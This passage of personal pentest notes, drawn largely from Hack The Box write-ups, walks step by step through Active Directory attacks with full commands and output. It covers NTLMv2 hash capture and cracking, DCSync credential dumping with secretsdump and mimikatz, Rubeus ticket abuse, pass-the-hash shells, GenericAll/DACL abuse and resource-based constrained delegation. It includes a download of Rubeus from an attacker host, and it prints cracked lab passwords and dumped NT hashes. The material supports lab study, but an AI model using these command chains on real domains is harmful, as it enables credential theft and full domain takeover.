putting file 0xdf-(stylesheet).xml as \0xdf-(stylesheet).xml (0.6 kb/s) (average 1.5 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \0xdf.wax
NT_STATUS_ACCESS_DENIED opening remote file \zoom-attack-instructions.txt
NT_STATUS_ACCESS_DENIED opening remote file \0xdf-(includepicture).docx
NT_STATUS_ACCESS_DENIED opening remote file \0xdf.scf
NT_STATUS_ACCESS_DENIED opening remote file \0xdf.m3u
NT_STATUS_ACCESS_DENIED opening remote file \0xdf-(url).url
NT_STATUS_ACCESS_DENIED opening remote file \0xdf-(remotetemplate).docx
NT_STATUS_ACCESS_DENIED opening remote file \Autorun.inf
NT_STATUS_ACCESS_DENIED opening remote file \0xdf.pdf
putting file 0xdf-(fulldocx).xml as \0xdf-(fulldocx).xml (156.1 kb/s) (average 40.2 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \0xdf-(externalcell).xlsx
NT_STATUS_ACCESS_DENIED opening remote file \0xdf.lnk
smb: \> ls
  .                                   D        0  Fri Oct 28 21:22:19 2022
  ..                                  D        0  Fri Oct 28 21:22:19 2022
  0xdf-(fulldocx).xml                 A    72584  Fri Oct 28 21:22:19 2022
  0xdf-(stylesheet).xml               A      162  Fri Oct 28 21:22:18 2022
  0xdf.application                    A     1649  Fri Oct 28 21:22:17 2022
  0xdf.jnlp                           A      191  Fri Oct 28 21:22:16 2022
  desktop.ini                         A       46  Fri Oct 28 21:22:17 2022

                7706623 blocks of size 4096. 3748999 blocks available
```

Interestingly, a bunch are blocked. But a few do make it.

With responder still running, after a minute or two there’s a hit from C.Bum:

```
[SMB] NTLMv2-SSP Client   : ::ffff:10.10.11.187
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:01f43be12046b7a8:8ADA90E6C9FD9597A77028B01332FA06:010100000000000080C2A3C1D8EAD801955E5614E82C877C000000000200080030004A004300330001001E00570049004E002D005200530054005200310047004200510038003600350004003400570049004E002D00520053005400520031004700420051003800360035002E0030004A00430033002E004C004F00430041004C000300140030004A00430033002E004C004F00430041004C000500140030004A00430033002E004C004F00430041004C000700080080C2A3C1D8EAD80106000400020000000800300030000000000000000000000000300000B1315E28BC96528147F3929B329DC4FE9D27ADEB96DF3BCF9F6C892CCB4443D80A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0036000000000000000000
```

Now we can crack it , hashcat with rockyou will quickly return the password “Tikkycoll_431012284”:
```
hashcat c.bum-net-ntlmv2 /usr/share/wordlists/rockyou.tx
```
```
oxdf@hacky$ crackmapexec smb flight.htb -u c.bum -p 'Tikkycoll_431012284'
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284
```

# GET AD INFO
#### LDAPDomainDump 
```
# Active Directory information dumper via LDAP
# (LDAP is interesting protocol for gathering information in the recon phase of a pentest of an internal network. A problem is that data from LDAP often is not available in an easy to read format. ldapdomaindump is a tool which aims to solve this problem, by collecting and parsing information available via LDAP and outputting it in a human readable HTML format, as well as machine readable json and csv/tsv/greppable files)
```
```
ldapdomaindump  10.10.131.138 -u 'LAB.ENTERPRISE.THM\contracter-temp' -p 'Password123!'
```
[More](https://0xdf.gitlab.io/2024/03/16/htb-manager.html#enumeration-as-operator)

#### BLOODHOUND 

Install and setup Blood hound
```
sudo apt update && sudo apt install -y bloodhound
# After installation completes, start neo4j
sudo neo4j console
#  change the default credentials for neo4j. Navigate to http://localhost:7474/ and login with the default credentials
neo4j neo4j
# Now that the password has been successfully modified you can finally launch Bloodhound with the new credentials.
```

```
bloodhound-python -d 'sequel.htb' -u 'sql_svc' -p 'REGGIE1234ronnie' -c all -ns 10.10.11.202
```
```
bloodhound-python -c All -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' -ns 10.10.11.158 -d streamio.htb -dc streamio.htb --zip
```
# ABUSE DC REPLICATION

The IT infrastructure of organizations often needs the existence of more than one Domain Controller (DC) for it's Active Directory (AD). For keeping an environment with more than one DC consistent, it is necessary to have the AD objects replicated through those DCs.

Most of the replication related tasks are done using `Directory Replication Service (DRS) Remote Protocol` and the Microsoft API which implements this protocol is called `DRSUAPI`.

How it Does? - The client DC sends a `DSGetNCChanges` request to the another DC server when the first one wants to get AD objects updates from the second one. The response contains a set of updates that the client can apply to its `NC replica`. (NC means Naming context, they define the scope of replication).

It is possible that the set of updates is too large for only one response message. In those cases, multiple DSGetNCChanges requests and responses are done. This process is called replication cycle or simply cycle.

[More](https://wiki.samba.org/index.php/DRSUAPI)

#### DCSync

DCSync Attack is a technique in which domain object impersonates as a 'Domain Controller' and request another Domain Controller in domain to replicate the user credentials via `GetNCChanges` ie leveraging `Directory Replication Service`(DRS) remote protocol.

By doing so, attackers can obtain password hashes, secrets, and other critical data.

##### General

What it requires for domain object to impersonate as a Domain Controller? - It requires following privileges / rights:

1. `DS-Replication-Get-Changes` - Extended right needed to replicate only those changes from a given NC that are also replicated to the Global Catalog (excludes secret domain data)
2. `DS-Replication-Get-Changes-All` - Control access right that allows the replication of all data in a given replication NC, including secret domain data.
3. `DS-Replication-Get-Changes-In-Filtered-Set` - (rare, only required in some environments) Replicating Directory Changes In Filtered Set 

Note that Members of the Administrators, Domain Admins, Enterprise Admins, and Domain Controllers groups already have these privileges by default.

[More](https://adsecurity.org/?p=1729)

1. Find if user has DCSync privilege using bloodhound
- check if account has access to `GetChanges` and `GetChangesAll` on the domain
![alt text](https://0xdfimages.gitlab.io/img/image-20200715064902861.webp)

2. Add DCSync privilege to a user by abusing DACL
- check if any object hash writeDACL, then work on adding controlled object to that group or to get control of that object

3. Dump secrets

**secretdump.py**
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!'@10.10.10.175
```

**Mimikatz**
```
https://0xdf.gitlab.io/2024/11/09/htb-blazorized.html#hash-dump 

# upload the exe file to target - https://github.com/gentilkiwi/mimikatz/releases
# upload it to shell of user with DCSync privileges only

*Evil-WinRM* PS C:\programdata> .\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit

```

##### Service Account on DC

When Windows service accounts authenticate over the network, they do so as the machine account on a domain-joined system. Because Service accounts are a type of Machine account only. 

we can verify this using a responder, for example if we control a service account named `iis apppool\defaultapppool`, then if try to open an SMB share on it (net use \\10.10.14.6\doesntmatter), the account we see trying to authenticate is flight\G0$ which is a mcahine account.
```
[SMB] NTLMv2-SSP Client   : ::ffff:10.10.11.187
[SMB] NTLMv2-SSP Username : flight\G0$
[SMB] NTLMv2-SSP Hash     : G0$::flight:1e589bf41238cf8e:547002306786919B6BB28F45BC6EEA4F:010100000000000080ADD9B1DBEAD801A1870276D7F4D729000000000200080052004F003500320001001E00570049004E002D00450046004B004A004B0059004500500037003900500004003400570049004E002D00450046004B004A004B005900450050003700
```

If we have control over a service account ie machine account on a DC, then we can just need a ticket for a machine account, using this ticket we can do a DcSync Attack, which is making machine ask Domain Controller for replication of a copy of all its data including password, hashes etc.

Key Point - With a control over service account on a DC, we can request ticket for that machine account and we can do a DCSync attack.

A service account is called as `Microsoft Virtual Account`.

Microsoft States That : ‘Services that run as virtual accounts access network resources by using the credentials of the computer account in the format <domain_name>\<computer_name>$ ‘. This is self-explanatory :)


[More](https://0xdf.gitlab.io/2021/11/08/htb-pivotapi-more.html#dcsync)
[More](https://0xdf.gitlab.io/2023/05/06/htb-flight.html#get-ticket)

**Attack Scenerio 1**

[More](https://0xdf.gitlab.io/2021/11/08/htb-pivotapi-more.html#dcsync)

We have control over service account of MSSQL.

Because I’m running as the service account for MSSQL, if I can authenticate back to the DC over the network as that account, it will be the machine account for the machine MSSQL is running on, which happens to be the DC. And the machine account for the DC has access to do a DC Sync attack, which is basically telling the DC you’d like copies of all of it’s data.

We need `Rebeus` tool for this attack.

[Rebeus](https://github.com/GhostPack/Rubeus). The Rubeus repo doesn’t keep compiled binaries, but the `SharpCollection` repo has a bunch of pre-compiled Windows attack tools. [SharpCollection](https://github.com/Flangvik/SharpCollection)
I’ll grab the `Rubeus.exe` from `NewFramework_4.0`_Any and upload it

[Rebeus.exe](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.0_Any/Rubeus.exe)

```
1. Use Rubeus.exe to first get a fake delegation ticket for the machine account.
2. Save that base64-encoded ticket to a file, and decode it into a new file.
3. Convert it to ccache format with another Impacket tool, ticketConverter.py
4. Set that file to be the KRB5CCNAME environment variable so that it is used to authentication on upcoming commands
5. Adjust Time Skew, update local system time to that of the server at the given IP.
6. Dump Hashes using DcSync using secretsdump.py
7. Get Shell using wmiexec.py or psexec.py using Pass-The-Hash.
```
1. Use Rubeus.exe to first get a fake delegation ticket for the machine account.
```
.\Rubeus.exe tgtdeleg /nowrap
```
```
CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\ProgramData> .\Rubeus.exe tgtdeleg /nowrap

[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/PivotAPI.LicorDeBellota.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: 6g2Dq2qtY+Nv3ER+m552rbUHenFM3DxlEdB/yjj3ssg=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFeDCCBXSgAwIBBaEDAgEWooIEajCCBGZhggRiMIIEXqADAgEFoRQbEkxJQ09SREVCRUxMT1RBLkhUQqInMCWgAwIBAqEeMBwbBmtyYnRndBsSTElDT1JERUJFTExPVEEuSFRCo4IEFjCCBBKgAwIBEqEDAgECooIEBASCBABJUJ+3dI0WAc0Nc/skPSgNY06KqGmwSNChX7FUMhYv+0MfoPwC4fKCbSO0nnDq1/RDQaUNRcqWl1D1l
dEObdHU6YyV0ebo6pZ8i4suKjXTX5M/gVz4ONSE4x05HHLSKI1wbmX7lWemSd5vzBmd9pgvp8D8CzN270ncW/c+gbcdv9OJ3EFNChci54AoUm1GbTlV4VJk8bLeTaSG9TmtQc/7pzXxcjBXbQ2hyfh4RaYFfg2LVmPv2x2Dr1/WhhcEaL/TrnIaWnhxZs6kIfmiHqh9c3ZGEgeuW3I9fwd+mUMCJqKOXSCdtgBUh70E+xHasNCqv/WCIfbb/II9
SHdDCI8Gj7eeRyeL+JY/YOXnHEtDtBcOHOmRHl+pTSRp3gDJyvpv5a7jdZD/4NDnlXtLOTPogKl90NRqpl5TyZShaCT8zso1yOGShy9e62LPTIpGGdEn+0QkilTu6SnKMvFP8peypzXCSHdbigKxrXnCpOlih0cS3RFvOS0l/NWiu2rz1Jf9OK4eStuDaE2MhP+58kozQRyAhKCAVQw02V9g+r9jR+3xe96mKHG00ZPwLRgpRVfcHypgfWy9Hqr
MtvO8tZpsbpd/+r32bGgce2aVtZp0rgq3NK1aD/ORE4V6AmynfgsQ+S4d53Dc76511AVtS1t11E6I1ilJVcMH+KnxGxOHi578pKSWHNPoUE5aQ58alCYIbljJcM/En16v+r+xM/rr8n9o483ma8b5KBuye5LZ1UB8IwlXSQSZbnB5y0cunIYgdfeBfBBB82ZWQcOx+kDyJIC/LkjBLxdpvPY8iqgk5GSn1KAQAu4lsFbgoRgT0BwhaueURGWNGy
gRyNe7tPxUp3WJCTrItYEG+JHcERBorY17wvPZ24QcCEjf26k1PiedA0LplVSVzjW+c8dka3JZfsB0hC5HAJzairIt5yFIUy+iuFSNC3aRYUfxXrtGJYNmfwjHsWiUX3sFBUTnSmwZIqB9dgE175fto4C9EEjdOGtQBKHde9Y8foxEJaosVg6XTHNPpft5hmly0uQlEuVFIBOEbMaZ/NfJ7frBF/rMrdR8w2ZLp2+F6A/Akww+5TukENgPCszCL
P7Y70VP4FXVK34r0JnEg4E8OoMs45iFN3eT9PU/kwNRCthxPx9xKvJd6cT9tzS8x9DbODLTbwhWrVIgTYXk6Fdlh/ogJXOd/DyF6ied0JEmy1znWnLwV2Vf+/ERnKEe0OJup3Pvsy8eNygMLBSMZ50K52Mr0oxplFP4rYXuR1hEoqgXJM++C+R7w4SUcNdtq7VcTpZkphV55YG6YugAaCOvrkwh66vgu0gQ39wrl23aWmli93cGdYC7+v4LzlXm
qu5j15djwxPFo4H5MIH2oAMCAQCige4Eget9gegwgeWggeIwgd8wgdygKzApoAMCARKhIgQgaAtQsYwuKV21JRM2y619pvqa/Kam3r7S+Pi4vd6wVHChFBsSTElDT1JERUJFTExPVEEuSFRCohYwFKADAgEBoQ0wCxsJUElWT1RBUEkkowcDBQBgoQAApREYDzIwMjExMTA3MjExODE5WqYRGA8yMDIxMTEwODA3MTgxOVqnERgPMjAyMTExMTQ
yMTE4MTlaqBQbEkxJQ09SREVCRUxMT1RBLkhUQqknMCWgAwIBAqEeMBwbBmtyYnRndBsSTElDT1JERUJFTExPVEEuSFRC

```

2. Save that base64-encoded ticket to a file, and decode it into a new file.
```
oxdf@parrot$ base64 -d machine.kirbi.b64 > machine.kirbi
```
3. Convert it to ccache format with another Impacket tool, ticketConverter.py
```
oxdf@parrot$ ticketConverter.py machine.kirbi machine.ccache
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] converting kirbi to ccache...
[+] done
```
4. Set that file to be the KRB5CCNAME environment variable so that it is used to authentication on upcoming commands
```
oxdf@parrot$ export KRB5CCNAME=/home/oxdf/hackthebox/pivotapi-10.10.10.240/machine.ccache
```
5. Adjust Time Skew, update local system time to that of the server at the given IP.
```
oxdf@parrot$ sudo ntpdate -u 10.10.10.240
```
6. Dump Hashes using DcSync using secretsdump.py
```
oxdf@parrot$ secretsdump.py LICORDEBELLOTA.HTB/pivotapi\$@pivotapi.licordebellota.htb -dc-ip 10.10.10.240 -no-pass -k                                                          
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets                            
Administrador:500:aad3b435b51404eeaad3b435b51404ee:efbb8ce4a3ea4cdd0377e13a6fe9e37e:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3fc8c66f79c15020a2c2c7f1cffd8049:::
cybervaca:1000:aad3b435b51404eeaad3b435b51404ee:c33f387f6f7ab01aa1a8a29039d9feef:::
LicorDeBellota.htb\3v4Si0N:1107:aad3b435b51404eeaad3b435b51404ee:bcc9e3e5704ae1c7a91cbef273ff23e5:::
LicorDeBellota.htb\Kaorz:1109:aad3b435b51404eeaad3b435b51404ee:9c26ac73552428b4b624e7fbcc720b85:::
LicorDeBellota.htb\jari:1116:aad3b435b51404eeaad3b435b51404ee:139fcd90ef171f43ef5b48025f773848:::
LicorDeBellota.htb\superfume:1117:aad3b435b51404eeaad3b435b51404ee:cff95776a76ea23a8106d6653daa4cbc:::
LicorDeBellota.htb\Dr.Zaiuss:1118:aad3b435b51404eeaad3b435b51404ee:cff95776a76ea23a8106d6653daa4cbc:::
...[snip]...
```
7. Get Shell using wmiexec.py using Pass-The-Hash.
```
oxdf@parrot$ wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c33f387f6f7ab01aa1a8a29039d9feef cybervaca@10.10.10.240
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
licordebellota\cybervaca
C:\>cd \users\cybervaca\desktop
C:\users\cybervaca\desktop>type root.txt
b32c5e3e************************
```

**Attack Scenario 2**

[More](https://0xdf.gitlab.io/2023/05/06/htb-flight.html#get-ticket)

We have a control over a service account (ie Microsoft Virtual Account) named `iis apppool\defaultapppool`


[Rebeus.exe](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.0_Any/Rubeus.exe)

```
0. upload rebues.exe
1. Use Rubeus.exe to first get a fake delegation ticket for the machine account.
2. Save that base64-encoded ticket and save it as ticket.kirbi
3. Convert it to ccache format with another Impacket tool, ticketConverter.py
  - we can also use kirbi2ccache to convert
4. Set that file to be the KRB5CCNAME environment variable so that it is used to authentication on upcoming commands
5. Adjust Time Skew, update local system time to that of the server at the given IP.
6. Dump Hashes using DcSync using secretsdump.py
7. Get Shell using wmiexec.py or psexec.py using Pass-The-Hash.
```
```
c:\ProgramData>powershell wget 10.10.14.6/Rubeus.exe -outfile rubeus.exe
```
```
c:\ProgramData>.\rubeus.exe tgtdeleg /nowrap
```
```
oxdf@hacky$ kirbi2ccache ticket.kirbi ticket.ccache 
```
```
oxdf@hacky$ export KRB5CCNAME=ticket.ccache 
```
```
oxdf@hacky$ sudo ntpdate -s flight.htb
```
```
oxdf@hacky$ secretsdump.py -k -no-pass g0.flight.htb -just-dc-user administrator
```
```
oxdf@hacky$ rlwrap -cAr psexec.py administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c
```

# ABUSE DACL
In Active Directory (AD), a `DACL (Discretionary Access Control List)` is a component of an object, that specifies which users or groups are allowed (or denied) access to the object and what actions they are permitted to perform. It essentially controls who can do what to an object, such as a user account, computer, group, or any other directory object.

Weak DACLs can lead to unauthorized access or privilege escalation if not properly configured.

DACL Key Concepts:

* `Access Control Entries (ACEs)`: A DACL is made up of multiple ACEs. Each ACE defines the specific access rights for a user or group. 
* `Permissions`: Permissions define the specific actions a user or group can perform on an object.
* `Rights` : Rights are a higher-level abstraction of permissions

  - `GenericAll`: Grants full control over an object (e.g., modify properties, reset passwords, etc.).
  - `GenericWrite`: Allows modification of some object properties.
  - `WriteDACL`: Lets the user modify the DACL itself, potentially escalating privileges.
  - `WriteOwner`: Grants the ability to take ownership of the object, allowing further privilege modification.
  - `ReadProperty`: Allows reading of object properties (e.g., attributes in a user object).
  - `AllExtendedRights`: Grants special rights for advanced operations, like resetting passwords or enabling delegation.
  - `Delete`: Grants the ability to delete the object.
  - `ReadDACL`: Allows reading the object’s access permissions without being able to change them.
  - `ForceChangePassword`: Allows forcing a user to change their password without knowing the current one.

## GenericAll (Full Control)


The “Generic ALL” privilege is one of the **most powerful** in AD because it grants complete control over the target object.

```
Note - All the Thing which "GenericWrite" can do can be done using "GenericAll" - both are write privilege and GenericAll is more powerful.

- If the “Generic ALL” privilege is applied to a user account, the attacker can reset the account’s password, can log in as that user

- If the “Generic ALL” privilege is applied to a group, the attacker can add themselves or anyone you control to a high-privilege group, gaining privileges of that groups.

- A compromised user who has write privilege (ie GenericAll) over a DC computer object can add a fake computer in that domain, then configure that DC to allow that fake machine to impersonate as DC by changing Domain Controller's msDS-AllowedToActOnBehalfOfOtherIdentity attribute.

- In extreme cases, an attacker with “Generic ALL” can delete critical objects, such as service accounts or privileged users
```
[More](https://www.hackingarticles.in/abusing-ad-dacl-generic-all-permissions/)

### GenericAll To User
```
1. The most straight forward way to abuse GenericAll on user is to change the user’s password.

2. We can add an SPN (ServicePrincipalName) to target account and immediately initiate a targeted Kerberoasting attack.
```

[!alt text](https://0xdf.gitlab.io/img/image-20241116160756713.webp)

#### Change Password

[More](https://0xdf.gitlab.io/2025/04/19/htb-administrator.html#bloodhound)

![alt text](https://0xdf.gitlab.io/img/image-20241115181154270.webp)

```
1. Change Password using net rpc
2. verify using crackmapexec
```
1. Change Password using net rpc
```
net rpc password "michael" "0xdf0xdf." -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.10.11.42
```
2. verify using crackmapexec
```
crackmapexec smb 10.10.11.42 -u michael -p '0xdf0xdf.'
```
OR
```
crackmapexec winrm 10.10.11.42 -u michael -p '0xdf0xdf.'
```

### GenericAll To Group
```
- Adding yourself to Privileged Group: If the “Generic ALL” privilege is applied to a group, the attacker can add themselves or anyone to a high-privilege group, gaining privileges of that groups.


```

#### Add To Group

For Example: Since we have GenericAll privileges to the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL, we can add ourself or create a user and add it to this group, further we can exploite WriteDACL permission on domain HTB.LOCAL where we can write DCSync rights to this user and then perform DCSync attack to get hashes from DC.

![alt text](https://0xdfimages.gitlab.io/img/1571511066627.webp)

With Shell using net binary
```
# Creating new User and adding to EXCHANGE WINDOWS PERMISSIONS

net user marvel 'Passw0rd' \add \domain
net group "Windows Execution Permissions" marvel \add

# OR Adding user I already control (svc-alresfco) to EXCHANGE WINDOWS PERMISSIONS

net group "Exchange Windows Permissions" svc-alfresco /add /domain
```

Remotely using "Linux Net RPC – Samba" (this is shown from https://0xdf.gitlab.io/2025/03/15/htb-certified.html#add-judithmader-to-management)
```
# use the net binary to add judith.mader to the `Management` group

oxdf@hacky$ net rpc group addmem Management judith.mader -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41

# This command doesn’t return anything. I can check the group members with another net command:

oxdf@hacky$ net rpc group members Management -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41
CERTIFIED\judith.mader
CERTIFIED\management_svc

```

### GeneriAll To Computer Object
```
- A compromised user who has write privilege (ie GenericAll) over a DC computer object can add a fake computer in that domain, then configure that DC to allow that fake machine to impersonate as DC by changing Domain Controller's msDS-AllowedToActOnBehalfOfOtherIdentity attribute.
```

#### Rewrite DC’s AllowedToActOnBehalfOfOtherIdentity properties (abuse RBCD)

If an attacker gains control over a Domain Controller computer object and modifies its delegation settings, they can effectively impersonate Domain Controller's privileged accounts, leading to full domain compromise.

This simply means that the compromised domain joined user who has write privilege (ie `GenericAll`) over a DC computer object can add a fake computer in that domain, and then (by abusing GenericAll rights) configure that DC to allow that fake machine to impersonate as DC. 

(by default, any user on domain joined computer can create add up to 10 machines to that domain, this is configured in the `ms-ds-machineaccountquota` attribute, which needs to be larger than 0.)

Note that A user or machine can be granted permission to act on behalf of other identities by modifying the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the target machine. In this case Fake computer can be granted permission to act on behalf of Domain Controller by changing Domain Controller's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

The User then uses fake machine account to requests a Kerberos Service Ticket for a privileged DC user (e.g., Administrator) using Service for User to Self (S4U2Self).

Then, it escalates the ticket using Service for User to Proxy (S4U2Proxy) to obtain access to DC$.

**HTB Support Room Example:** 

The compromised 'support' user is a member of the Shared Support Accounts group, which has GenericAll on the computer object, DC.SUPPORT.HTB.

![alt text](https://0xdfimages.gitlab.io/img/image-20220527143212616.webp)

Support user can add a fake computer to domain using this DC machine and then change DC's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to allow fake computer to impersonate or act as DC.

![alt text](https://0xdfimages.gitlab.io/img/image-20220527153649549.webp)

[More](https://0xdf.gitlab.io/2022/12/17/htb-support.html#shell-as-domainadmin)

**Steps To Perform Attack**
```
0. Verify Environment
  - Verify the administrator on DC using BloodHound, you will use this privileged account on DC to impersonate.
  - Verify that users can add machines to the domain, you can check ms-ds-machineaccountquota which can be 0 to 10.
  - Verify and make sure that DC OSVersion is more than 2012
  - Verify that the msds-allowedtoactonbehalfofotheridentity is empty:
1. Create a fake computer account and note the SID of that computer object
2. Next we use our GenericAll rights on the DC to set the msds-allowedtoactonbehalfofotheridentity security descriptor to our newly created fake computer, this will create an ACL with the fake computer’s SID and assign that to the DC
  - You can verify that there is now an ACL with the SecurityIdentifier of fake computer and it says AccessAllowed.
  - You can also verify by re-running bloodhound, it will show you facke computer with 'AllowedToAct' rights on DC
3. Obtain a ticket (delegation operation), Now we take advantage of S4U2Self by impersonating the DC's administrator user to request a service ticket.
5. Once the ticket is obtained, it can be used with pass-the-ticket ie Finally we can use that Kerberos ticket to connect as the administrator user.
```

**Using Windows**

Need three scripts to complete this attack:

[PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
[PowerMad.ps1](https://github.com/Kevin-Robertson/Powermad)
[Rubeus.exe](https://github.com/GhostPack/Rubeus)

Upload these and import the two PowerShell scripts into session
```
*Evil-WinRM* PS C:\programdata> upload /opt/PowerSploit/Recon/PowerView.ps1

*Evil-WinRM* PS C:\programdata> upload /opt/Powermad/Powermad.ps1

*Evil-WinRM* PS C:\programdata> upload /opt/SharpCollection/NetFramework_4.5_x64/Rubeus.exe

*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
*Evil-WinRM* PS C:\programdata> . .\Powermad.ps1

```

1. Verify Envirnment
```
# I’ll need to know the administrator on DC, which Bloodhound tells me is administrator@support.htb

# verify that users can add machines to the domain:

Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota

# make sure there’s a 2012+ DC in the environment:

Get-DomainController | select name,osversion | fl
```
2. Create FakeComputer
```
# use the Powermad New-MachineAccount to create a fake computer:

*Evil-WinRM* PS C:\programdata> New-MachineAccount -MachineAccount 0xdfFakeComputer -Password $(ConvertTo-SecureString '0xdf0xdf123' -AsPlainText -Force)

# I need the SID of the computer object as well, so I’ll save it in a variable:
*Evil-WinRM* PS C:\programdata> $fakesid = Get-DomainComputer 0xdfFakeComputer | select -expand objectsid
*Evil-WinRM* PS C:\programdata> $fakesid
S-1-5-21-1677581083-3380853377-188903654-1121
```
3. Configure the DC to trust our fake computer
```
*Evil-WinRM* PS C:\programdata> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
*Evil-WinRM* PS C:\programdata> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\programdata> $SD.GetBinaryForm($SDBytes, 0)
*Evil-WinRM* PS C:\programdata> Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# verify it worked
*Evil-WinRM* PS C:\programdata> $RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
*Evil-WinRM* PS C:\programdata> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
*Evil-WinRM* PS C:\programdata> $Descriptor.DiscretionaryAcl

BinaryLength       : 36
AceQualifier       : AccessAllowed
IsCallback         : False
OpaqueLength       : 0
AccessMask         : 983551
SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-1121
AceType            : AccessAllowed
AceFlags           : None
IsInherited        : False
InheritanceFlags   : None
PropagationFlags   : None
AuditFlags         : None
```
4. Authenticate as Fake Computer and get Ticket, ie Now we take advantage of S4U2Self by impersonating the administrator user to request a service ticket:
```
# I need the one labeled rc4_hmac, which I’ll pass to Rubeus to get a ticket for administrator:

*Evil-WinRM* PS C:\programdata> .\Rubeus.exe hash /password:0xdf0xdf123 /user:0xdfFakeComputer /domain:support.htb

*Evil-WinRM* PS C:\programdata> .\Rubeus.exe s4u /user:0xdfFakeComputer$ /rc4:B1809AB221A7E1F4545BD9E24E49D5F4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt

# Rubeus shows the ticket in this session:

*Evil-WinRM* PS C:\programdata> .\Rubeus.exe klist
```
5. Using ticket as Pass-The-Ticket
```
# I’ll grab the last ticket Rubeus generated, and copy it back to my machine, saving it as ticket.kirbi.b64, making sure to remove all spaces. I’ll base64 decode it into ticket.kirbi:

oxdf@hacky$ base64 -d ticket.kirbi.b64 > ticket.kirbi

# Now I need to convert it to a format that Impact can use:

oxdf@hacky$ ticketConverter.py ticket.kirbi ticket.ccache

# I can use this to get a shell using psexec.py:

oxdf@hacky$ KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```
[More](https://0xdf.gitlab.io/2022/12/17/htb-support.html#get-domain-tgt)
[More](https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff#file-rbcd_demo-ps1)

**Using Linux**

1. Add a fake computer
```
python3 /usr/share/doc/python3-impacket/examples/addcomputer.py -dc-ip 10.10.11.174 -computer-pass pencer -computer-name pencer support.htb/support:Ironside47pleasure40Watchful
```
2. Use our GenericAll rights on the DC to set the msds-allowedtoactonbehalfofotheridentity security descriptor to our newly created computer
```
python3 /usr/share/doc/python3-impacket/examples/rbcd.py -action write -delegate-to "dc$" -delegate-from "pencer$" -dc-ip 10.10.11.174 support.htb/support:Ironside47pleasure40Watchful
```
3. Take advantage of S4U2Self by impersonating the administrator user to request a service ticket
```
python3 /usr/share/doc/python3-impacket/examples/getST.py support.htb/pencer$:pencer -spn www/dc.support.htb -impersonate administrator
```
4. Export it and check
```
export KRB5CCNAME=administrator.ccache
```
5. Finally we can use PsExec that Kerberos ticket to connect as the administrator user uing Pass-The-Ticket
```
python3 /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass support.htb/administrator@dc.support.htb -dc-ip 10.10.11.174
```
[More](https://pencer.io/ctf/ctf-htb-support/#rbcd)

## GenericWrite

GenericWrite has powers similar to GenericAll, except for properties that require special permissions such as resetting passwords.

```
- If the “GenericWrite” privilege is applied to a user account, then we can add an SPN (ServicePrincipalName) to that account and immediately initiate a targeted Kerberoasting attack.

- If the “GenericWrite” privilege is applied to a group, the attacker can add themselves or anyone you control to a high-privilege group, gaining privileges of that groups.

